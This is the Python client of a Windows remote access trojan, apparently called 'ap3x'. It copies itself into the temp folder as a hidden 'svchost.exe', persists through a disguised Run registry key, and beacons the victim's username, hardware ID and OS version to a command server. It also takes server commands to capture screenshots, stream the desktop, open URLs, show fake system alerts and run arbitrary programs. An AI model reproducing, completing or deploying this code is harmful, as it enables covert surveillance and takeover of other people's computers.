# -*- coding: utf-8 -*-
import os
import socket
import threading
import time
from subprocess import check_output, DEVNULL, Popen #HWID GET
from PIL import ImageGrab #screenshot
import io
#from PIL import Image
from vidstream import ScreenShareClient #remote desktop
from ctypes import windll, WinDLL, Structure, wintypes #MessageBox
from platform import release as osrelease #WINDOWS VERSION
import sys
from shutil import copyfile as scopyfile
from winreg import HKEY_CURRENT_USER, OpenKey, SetValueEx, REG_SZ, KEY_WRITE

FILE_ATTRIBUTE_HIDDEN = 0x2

class FILE_ATTRIBUTE(Structure):
    _fields_ = [("dwFileAttributes", wintypes.DWORD)]

def LuminaMystGroveWhisper():
    current_exe_path = sys.argv[0]
    
    temp_copy_path = os.path.join(os.environ['TEMP'], "svchost.exe")
    
    try:
        scopyfile(current_exe_path, temp_copy_path)
        
        attrs = FILE_ATTRIBUTE()
        attrs.dwFileAttributes = FILE_ATTRIBUTE_HIDDEN
        windll.kernel32.SetFileAttributesW(temp_copy_path, attrs.dwFileAttributes)
            
    except:
        pass
    
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key_name = "Windows Host Device"
    with OpenKey(HKEY_CURRENT_USER, key_path, 0, KEY_WRITE) as key:
        SetValueEx(key, key_name, 0, REG_SZ, temp_copy_path)
    
    Popen(temp_copy_path, close_fds=True)

    sys.exit(0)

def FloraNovaLumisZephyr():
    if getattr(sys, 'frozen', False):
        if sys.executable.endswith("svchost.exe"):
            pass
        else:
            LuminaMystGroveWhisper()
    else:
        #if .py
        pass



server_ip = "127.0.0.1"
server_port = 4639

data_transfering = False #noerror

build = "v1.1"
username = os.environ.get('USERNAME')

def get_os_version():
    release = osrelease()
    return f"Windows {release}"

def get_hwid():
    output = check_output('wmic csproduct get UUID', shell=True, stderr=DEVNULL).decode('utf-8')
    lines = output.strip().split('\r\r\n')
    hwid = lines[1].strip()
    return hwid

hwid = get_hwid()
os_version = get_os_version()
#print(os_version)

def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_bytes = io.BytesIO()
    screenshot.save(screenshot_bytes, format="PNG")
    screenshot_bytes = screenshot_bytes.getvalue()
    return screenshot_bytes

def handle_server_commands(client_socket):
    global data_transfering
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if data == "ap3x_screenshot":
                try:
                    data_transfering = True
                    print("[DEBUG] Sharing screenshot ...")
                    screenshot_bytes = take_screenshot()
                    screenshot_size = len(screenshot_bytes)
                    client_socket.send("ap3x_screenshot".encode())
                    time.sleep(0.5)
                    client_socket.send(str(screenshot_size).encode())
                    time.sleep(0.5)
                    sent_bytes = 0
                    while sent_bytes < screenshot_size:
                        chunk = screenshot_bytes[sent_bytes : sent_bytes + 1024]
                        client_socket.send(chunk)
                        sent_bytes += len(chunk)
                except:
                    pass
                finally:
                    data_transfering = False
            elif data == "ap3x_rmt_desktop":
                try:
                    data_transfering = True
                    print("[*] Starting Remote Desktop ...")
                    sender = ScreenShareClient(server_ip, 4224) #remote desktop
                    stream_sender_th = threading.Thread(target=sender.start_stream)
                    stream_sender_th.start()
                except:
                    pass
                finally:
                    data_transfering = False
            elif data.startswith("URLop3n_ap3x:"):
                try:
                    data_transfering = True
                    command, url = data.split("::")
                    #print(url)
                    open_url = check_output(f'explorer.exe {url}', shell=True, stderr=DEVNULL).decode('utf-8')
                except:
                    pass
                finally:
                    data_transfering = False
            elif data.startswith("Ap3x_MessageBox:"):
                try:
                    data_transfering = True
                    command, box_text = data.split("::")
                    #print(box_text)
                    windll.user32.MessageBoxW(0, f"{box_text}", "System Info", 0 | 0x10)
                except:
                    pass
                finally:
                    data_transfering = False
            elif data.startswith("Ap3xTask_MGR:"):
                try:
                    data_transfering = True
                    command, taskmgr = data.split("::")
                    #print(taskmgr)
                    Popen(f'{taskmgr}')
                except:
                    pass
                finally:
                    data_transfering = False
            elif data:
                print(data)
        except:
            break


def connect_to_server():
    global data_transfering
    global client_socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            data_transfering = True
            client_socket.connect((server_ip, server_port))
            client_socket.send(build.encode())
            time.sleep(0.5)
            client_socket.send(username.encode())
            time.sleep(0.5)
            client_socket.send(hwid.encode())
            time.sleep(0.5)
            client_socket.send(os_version.encode())
            data_transfering = False

            client_thread = threading.Thread(target=handle_server_commands, args=(client_socket,))
            client_thread.daemon = True
            client_thread.start()

            while True:
                if not data_transfering:
                    data = "ap3x"
                    client_socket.send(data.encode())
                    time.sleep(20)
                else:
                    pass

        except:
            print("[DEBUG] Connection lost. Retrying...")
            try:
                client_socket.close()
            except:
                pass
            try:
                connect_to_server()
            except:
                pass

def reconnect():
    global connect_thread
    while True:
        try:
            client_socket.close()
        except:
            pass
        try:
            connect_thread = threading.Thread(target=connect_to_server)
            connect_thread.daemon = True
            connect_thread.start()
        except:
            pass
        print("[DEBUG] RECONNECTING ...")
        time.sleep(350)

reconnect_thread = threading.Thread(target=reconnect)
reconnect_thread.daemon = True
reconnect_thread.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    pass
